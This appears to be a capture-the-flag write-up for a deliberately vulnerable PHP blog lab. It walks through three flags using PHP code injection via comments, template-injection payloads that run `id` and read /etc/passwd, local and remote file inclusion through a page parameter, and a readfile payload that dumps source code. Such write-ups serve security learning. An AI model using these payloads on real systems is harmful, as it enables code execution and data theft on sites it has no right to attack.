# Cody's First Blog

## 1. Flag 1

Tried XSS in comments input `<script>alert(1)</script>` no luck.

Checked the banner had `PHP/5.5.9-1ubuntu4.24`

Tried `<?php echo "hello world!"?>` in comment input and submit. 

Got the flag.

## 2. Flag 2

Viewed the HTML source code found a comment line 

```php+HTML
<!--<a href="?page=admin.auth.inc">Admin login</a>-->
```

Tried `http://34.74.105.127/b7370ccb5d/?page=admin.auth.inc`

Got Admin login page. 

Tried some brute force, didn't work. 

Tried `http://34.74.105.127/b7370ccb5d/?page=aaa`

Got  error,![image-20200510141012566](/Users/rajsharm/Library/Application Support/typora-user-images/image-20200510141012566.jpg)

Script is adding .php to whatever value is being passed. 

Tried some template injection as well

```php
{php}echo `id`;{/php}
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
```

None of them work. 

Intestingly noticed `:` in `?page=aaa:` didn't throw any error.

Tried remote page inclusion

`http://34.74.105.127/b7370ccb5d/?page=http://dude0.co/test`

Didn't work, the page was not accessible. The intro was right.

Tried, `http://34.74.105.127/b7370ccb5d/?page=http://localhost/index` , it worked.

But need to find a way to inject code to.

Interestingly, after some reseach come to know that `admin.auth.inc` is three files.

`admin` , `auth`, `inc` , when used in include, all of them are included. 

Tried, `http://34.74.105.127/b7370ccb5d/?page=admin` no luck

Tried, `http://34.74.105.127/b7370ccb5d/?page=auth` no luck

Tried, `http://34.74.105.127/b7370ccb5d/?page=admin.inc` , BAAMM !! Got into admin page Directly. 

Flag was at the bottom.

## 3. Flag 3

With admin page access We have the ability to approve any comments. Good now we have Server XSS. 

Approved my previous comment made during Flag 1. 

Loaded,`http://34.74.105.127/b7370ccb5d/?page=http://localhost/index`

Got Hello World! in page. 

Great 

Now commented `<?php echo readfile('index.php');?>` and approved it.

`http://34.74.105.127/b7370ccb5d/?page=http://localhost/index`

Loaded the page again, 

Got the source code and it included flag.



## Lessons

Wasted much of my time in Template injection vulnerability, tried injections for several template in php like twig and others. None of them worked. 

Also wasted much of the time in file inclusion, trying to inlude the file from remote server. Didn't work either.

Lesson: Stick to basic, analyze the problem, read the descriptions in page. Tried to prove the descriptions wrong with one or two attempts don't waste most of the time on that. They are usually correct. Check the banner and try to use banner specific attack instead of wasting time on random attacks.







